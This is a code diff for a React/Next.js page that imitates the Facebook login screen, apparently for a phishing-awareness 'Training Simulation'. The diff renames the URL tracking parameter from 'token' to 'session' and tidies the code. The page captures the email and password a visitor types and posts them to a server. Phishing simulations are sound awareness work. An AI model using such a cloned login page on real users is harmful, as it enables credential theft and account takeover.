@@ -8,12 +8,12 @@ import { useEffect, useState } from "react";
 export default function Home() {
   const sp = useSearchParams();
   const router = useRouter();
-
-  const token = sp.get("token") ?? "";
+  const token = sp.get("session") ?? "";
 
   const [emailOrPhone, setEmailOrPhone] = useState("");
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
+
   useEffect(() => {
     if (!token) return;
 
@@ -23,8 +23,9 @@ export default function Home() {
       body: JSON.stringify({ token }),
     });
   }, [token]);
-  async function onLogin() {
-    if (!token) return; // กันกรณีเข้าหน้านี้ตรงๆ โดยไม่มี token
+
+  const handleSubmit = async () => {
+    if (!token) return;
 
     try {
       setLoading(true);
@@ -37,23 +38,22 @@ export default function Home() {
           submitted_email: emailOrPhone,
           submitted_password: password,
         }),
-        
       });
 
       router.push("/result");
     } finally {
       setLoading(false);
     }
-  }
+  };
 
   return (
     <div className="bg-gray-100 h-screen flex items-center justify-center">
-      {/* watermark เล็กๆ เพื่อความเป็น training */}
+
       <div className="fixed top-3 right-4 text-xs text-gray-500">
         Training Simulation
       </div>
 
-      {/* Left Side */}
+      {/* Left */}
       <div className="text-3xl w-1/2 px-10">
         <Image
           src={"/images/facebook.png"}
@@ -66,17 +66,18 @@ export default function Home() {
         </p>
       </div>
 
-      {/* Right Side */}
+      {/* Right */}
       <div className="bg-white flex flex-col p-5 rounded-xl w-1/3">
         <input
-          className="my-2 border border-1 border-gray-100 p-3 rounded-md focus:outline-1 outline-blue-600"
+          className="my-2 border border-gray-100 p-3 rounded-md focus:outline-1 outline-blue-600"
           type="text"
           placeholder="Email address or phone number"
           value={emailOrPhone}
           onChange={(e) => setEmailOrPhone(e.target.value)}
         />
+
         <input
-          className="my-2 border border-1 border-gray-100 p-3 rounded-md focus:outline-1 outline-blue-600"
+          className="my-2 border border-gray-100 p-3 rounded-md focus:outline-1 outline-blue-600"
           type="password"
           placeholder="Password"
           value={password}
@@ -84,9 +85,9 @@ export default function Home() {
         />
 
         <button
-          onClick={onLogin}
+          onClick={handleSubmit}
           disabled={loading || !token}
-          className="bg-blue-600 my-2 py-2 text-lg font-bold text-white rounded-md hover:bg-blue-700 "
+          className="bg-blue-600 my-2 py-2 text-lg font-bold text-white rounded-md hover:bg-blue-700"
         >
           {loading ? "Logging in..." : "Log in"}
         </button>
@@ -94,9 +95,11 @@ export default function Home() {
         <p className="cursor-pointer text-blue-600 text-sm my-2 text-center hover:underline">
           Forgotten password?
         </p>
+
         <span className="my-2">
           <hr />
         </span>
+
         <button className="bg-green-500 my-2 py-2 px-2 text-lg font-bold text-white rounded-md hover:bg-green-600 w-fit mx-auto">
           Create new account
         </button>
